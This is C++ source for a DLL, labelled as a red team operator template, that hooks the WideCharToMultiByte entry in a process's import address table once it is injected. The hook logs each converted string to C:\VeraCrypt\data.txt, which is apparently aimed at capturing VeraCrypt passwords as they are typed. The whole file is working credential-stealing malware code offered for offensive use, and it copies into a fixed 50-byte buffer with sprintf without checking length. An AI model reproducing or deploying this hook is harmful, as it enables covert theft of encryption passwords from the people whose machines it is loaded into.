/*
 
 Red Team Operator code template
 IAT Hooking DLL

 author: reenz0h (twitter: @SEKTOR7net)
 modified by: geobour98
 credits: Jeremie Laval
*/

#include <stdio.h>
#include <windows.h>
#include <dbghelp.h>

#pragma comment(lib, "user32.lib")
#pragma comment (lib, "dbghelp.lib")

// pointer to original WideCharToMultiByte
int (WINAPI * pWideCharToMultiByte)(
  UINT                               CodePage,
  DWORD                              dwFlags,
  _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int                                cchWideChar,
  LPSTR                              lpMultiByteStr,
  int                                cbMultiByte,
  LPCCH                              lpDefaultChar,
  LPBOOL                             lpUsedDefaultChar
) = WideCharToMultiByte;

// Hooking function
int HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	
	int ret;
	char buffer[50];
	HANDLE hFile = NULL;
	DWORD numBytes;
	
	// call original function
	ret = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	
	sprintf(buffer, "DATA = %s\n", lpMultiByteStr);
	//OutputDebugStringA(buffer);
	
	// store captured data in a file
	hFile = CreateFile("C:\\VeraCrypt\\data.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		OutputDebugStringA("Error with log file!\n");
	else
		WriteFile(hFile, buffer, strlen(buffer), &numBytes, NULL);

	CloseHandle(hFile);
	
	return ret;
}


// Set hook on origFunc()
BOOL Hookem(char * dll, char * origFunc, PROC hookingFunc) {

    ULONG size;
	DWORD i;
	BOOL found = FALSE;

	// get a HANDLE to a main module == BaseImage
	HANDLE baseAddress = GetModuleHandle(NULL);			
	
	// get Import Table of main module
	PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR) ImageDirectoryEntryToDataEx(
												baseAddress,
												TRUE,
												IMAGE_DIRECTORY_ENTRY_IMPORT,
												&size,
												NULL);

	// find imports for target dll 
	for (i = 0; i < size ; i++){
		char * importName = (char *)((PBYTE) baseAddress + importTbl[i].Name);
		if (_stricmp(importName, dll) == 0) {
				found = TRUE;
				break;
		}
	}
	if (!found)
		return FALSE;

	// Optimization: get original address of function to hook 
	// and use it as a reference when searching through IAT directly
	PROC origFuncAddr = (PROC) GetProcAddress(GetModuleHandle(dll), origFunc);

	// Search IAT
	PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA) ((PBYTE) baseAddress + importTbl[i].FirstThunk);
	while (thunk->u1.Function) {
		PROC * currentFuncAddr = (PROC *) &thunk->u1.Function;
		
		// found
		if (*currentFuncAddr == origFuncAddr) {

			// make sure memory is writable
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID) currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);

			// set the hook
			*currentFuncAddr = (PROC)hookingFunc;

			// revert protection setting back
			VirtualProtect((LPVOID) currentFuncAddr, 4096, oldProtect, &oldProtect);

			//OutputDebugStringA("IAT function hooked!\n");
			return TRUE;
		}
	thunk++;
	}
	
	return FALSE;
}

extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			Hookem("kernel32.dll", "WideCharToMultiByte", (PROC) HookedWideCharToMultiByte);
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			break;
	}
	
    return TRUE;
}

